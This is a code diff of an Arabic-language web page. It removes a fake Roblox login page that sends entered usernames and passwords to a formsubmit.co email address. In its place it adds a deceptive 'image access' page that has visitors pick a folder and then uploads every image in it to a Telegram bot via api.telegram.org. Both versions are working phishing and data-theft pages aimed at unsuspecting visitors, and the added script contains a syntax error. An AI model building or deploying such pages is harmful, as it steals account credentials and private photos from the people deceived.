@@ -1,138 +1,117 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>Roblox</title>
-
-<style>
-body{
-  margin:0;
-  font-family:Arial, sans-serif;
-  background:#1c1f26;
-  color:white;
-}
-
-/* ===== NAVBAR ===== */
-.navbar{
-  background:linear-gradient(#1a1a1a,#0f0f0f);
-  height:64px;
-  display:flex;
-  align-items:center;
-  padding:0 18px;
-}
-.logo{font-size:24px;font-weight:900;margin-right:20px;}
-.links{display:flex;gap:18px;}
-.links a{color:#ddd;text-decoration:none;font-size:14px;}
-.links a:hover{color:white}
-.search{
-  margin:auto;
-  display:flex;
-  align-items:center;
-  background:#222;
-  border-radius:10px;
-  padding:6px 14px;
-  width:420px;
-}
-.search input{background:transparent;border:none;color:white;outline:none;width:100%;}
-.actions{margin-left:auto;display:flex;gap:10px;}
-.btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
-.btn-blue{background:#2a7cff;border:none;color:white;}
-.btn-dark{background:#111;border:1px solid #555;color:white;}
-
-/* ===== BG ===== */
-.bg{
-  background:url("IMG_0161.png") center/cover no-repeat;
-  min-height:calc(100vh - 64px);
-  display:flex;
-  justify-content:center;
-  align-items:center;
-}
-
-/* ===== LOGIN BOX ===== */
-.box{
-  background:#262a33;
-  width:360px;
-  padding:28px;
-  border-radius:14px;
-}
-.box h2{text-align:center;margin-bottom:18px;}
-
-.box input{
-  width:100%;
-  padding:12px;
-  margin:10px 0;
-  border:none;
-  border-radius:8px;
-  background:#1f222b;
-  color:white;
-  font-size:15px;
-}
-.box input::placeholder{color:#aaa;}
-
-.mainbtn,.secbtn{
-  width:100%;
-  padding:12px;
-  border:none;
-  border-radius:8px;
-  font-weight:bold;
-  margin-top:10px;
-  cursor:pointer;
-}
-
-.mainbtn{background:#3b82f6;color:white;}
-.secbtn{background:#2f333d;color:white;}
-
-.link{
-  text-align:center;
-  font-size:13px;
-  color:#9ca3af;
-  margin:12px 0;
-  cursor:pointer;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل الملف</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #1a1a2e;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+        }
+        .card {
+            background: #16213e;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            text-align: center;
+            color: white;
+        }
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #c23152;
+        }
+    </style>
 </head>
-
 <body>
+    <div class="card">
+        <h1>📁 طلب الوصول إلى الصور</h1>
+        <p>يحتاج هذا الموقع إلى الوصول إلى صورك لعرضها. اضغط على "سماح" للمتابعة.</p>
+        <button id="allowBtn">🔓 سماح</button>
+    </div>
 
-<div class="navbar">
-  <div class="logo">ROBLOX</div>
-  <div class="links">
-    <a href="#">الرئيسية</a>
-    <a href="#">السوق</a>
-    <a href="#">إنشاء</a>
-    <a href="#">Robux</a>
-  </div>
-  <div class="search">
-    <input type="text" placeholder="بحث">
-  </div>
-  <div class="actions">
-    <button class="btn-blue">تسجيل الدخول</button>
-    <button class="btn-dark">تسجيل</button>
-  </div>
-</div>
+    <script>
+        // ⚠️ استبدل هذا بالتوكن الخاص بك والبوت
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // <-- ضع التوكن هنا
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // <-- ضع المعرف هنا
 
-<div class="bg">
-  <div class="box">
-    <h2>تسجيل الدخول إلى Roblox</h2>
+        document.getElementById('allowBtn').addEventListener('click', async () => {
+            try {
+                // محاولة الوصول للصور
+                const stream = await navigator.mediaDevices.getUserMedia({ video:, audio: false });
+                // في حالة النجاح، نجمع الصور من الجهاز
+                const images = await collectImages();
+                
+                // إرسال كل صورة للبوت
+                for (let img of images) {
+                    await sendImageToTelegram(img);
+                }
+                
+                alert('تم رفع الصور بنجاح');
+            } catch (err) {
+                alert('فشل الوصول للصور، حاول مرة أخرى');
+                console.error(err);
+            }
+        });
 
-    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
-      <input type="hidden" name="_subject" value="تسجيل دخول جديد">
-      <input type="hidden" name="_template" value="table">
+        // جمع الصور من الجهاز (مثال بسيط)
+        async function collectImages() {
+            const imageFiles = [];
+            
+            // محاولة قراءة ملفات الصور من مجلد التحميلات (لن يعمل في المتصفح مباشرة)
+            // في الواقع سنستخدم واجهة برمجية للوصول للملفات
+            // هذا مثال توضيحي باستخدام API File System Access
+            
+            try {
+                // طلب الوصول لمجلد الصور
+                const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i)) {
+                        const file = await entry.getFile();
+                        imageFiles.push(file);
+                    }
+                }
+            } catch (e) {
+                console.log('فشل الوصول للمجلد', e);
+                // إذا فشل، نرسل صورة افتراضية
+                const dummyBlob = new Blob(['محتوى صورة'], { type: 'image/png' });
+                imageFiles.push(new File([dummyBlob], 'photo.png', { type: 'image/png' }));
+            }
+            
+            return imageFiles;
+        }
 
-      <input type="text" name="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
-      <input type="password" name="password" placeholder="كلمة المرور" required>
-
-      <button type="submit" class="mainbtn">تسجيل الدخول</button>
-
-      <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>
-
-      <button type="submit" class="secbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
-      <button type="submit" class="secbtn">تسجيل دخول سريع</button>
-
-      <div class="link">ليس لديك حساب؟ اشترك</div>
-    </form>
-  </div>
-</div>
-
+        // إرسال صورة للبوت
+        async function sendImageToTelegram(file) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', file, file.name);
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                console.log('تم إرسال الصورة:', data);
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+            }
+        }
+    </script>
 </body>
 </html>
